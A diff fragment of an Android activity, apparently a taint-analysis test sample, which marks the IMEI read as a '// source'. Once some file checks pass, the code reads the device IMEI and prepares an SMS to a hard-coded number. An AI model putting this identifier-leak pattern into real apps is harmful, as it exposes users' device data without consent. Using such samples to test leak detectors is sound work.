@@ -50,7 +50,7 @@ public class MainActivity extends Activity {
 		} else if (Da.exists() && Db.exists() && Dc.exists() && Dd.exists()
 				&& De.exists() && Df.exists()) {
 			TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-        	String imei = telephonyManager.getDeviceId(); 
+        	String imei = telephonyManager.getDeviceId(); // source
         	
 			SmsManager sm = SmsManager.getDefault();
 	    	String number = "+49 1234";
